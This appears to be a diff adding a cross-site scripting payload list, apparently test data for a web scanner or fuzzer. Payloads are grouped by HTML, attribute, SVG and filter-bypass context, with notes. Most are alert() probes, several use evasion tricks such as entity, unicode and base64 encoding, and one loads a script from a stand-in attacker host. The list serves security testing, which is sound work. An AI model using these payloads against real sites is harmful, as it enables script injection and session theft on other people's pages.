@@ -1,0 +1,37 @@
+# XSS Payloads
+# Format: payload ||| context ||| notes
+# Contexts: html, attr, js, svg, filter_bypass
+
+# --- HTML context (injected into page body) ---
+<script>alert('XSS')</script>                           ||| html          ||| classic script tag
+<script src=//evil.com/x.js></script>                   ||| html          ||| external script
+<img src=x onerror=alert('XSS')>                        ||| html          ||| img onerror
+<img src=x onerror=alert(1)>                            ||| html          ||| img onerror numeric
+<body onload=alert('XSS')>                              ||| html          ||| body onload
+<iframe src="javascript:alert('XSS')"></iframe>         ||| html          ||| iframe javascript
+<details open ontoggle=alert('XSS')>                    ||| html          ||| details ontoggle
+<video src=x onerror=alert('XSS')>                      ||| html          ||| video onerror
+<audio src=x onerror=alert('XSS')>                      ||| html          ||| audio onerror
+<input autofocus onfocus=alert('XSS')>                  ||| html          ||| input onfocus
+
+# --- Attribute context (injected into tag attributes) ---
+" onmouseover="alert('XSS')                             ||| attr          ||| break out of attribute
+' onmouseover='alert('XSS')                             ||| attr          ||| single quote break
+" autofocus onfocus="alert('XSS')                       ||| attr          ||| onfocus event
+"><script>alert('XSS')</script>                         ||| attr          ||| break attribute then script
+"><img src=x onerror=alert(1)>                          ||| attr          ||| break then img
+
+# --- SVG-based ---
+<svg onload=alert('XSS')>                               ||| svg           ||| svg onload
+<svg><script>alert('XSS')</script></svg>                ||| svg           ||| svg script
+<svg><animate onbegin=alert('XSS') attributeName=x>    ||| svg           ||| svg animate
+<svg/onload=alert('XSS')>                               ||| svg           ||| svg no space
+
+# --- Filter bypass attempts ---
+<ScRiPt>alert('XSS')</ScRiPt>                          ||| filter_bypass  ||| mixed case
+<scr<script>ipt>alert('XSS')</scr</script>ipt>         ||| filter_bypass  ||| nested tag
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>   ||| filter_bypass  ||| HTML entity encode
+<img src=x onerror=\u0061lert(1)>                      ||| filter_bypass  ||| unicode escape
+<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>    ||| filter_bypass  ||| base64 encoded
+<<script>alert('XSS');//<</script>                     ||| filter_bypass  ||| double open bracket
+<script>alert`XSS`</script>                            ||| filter_bypass  ||| template literal (no parens)
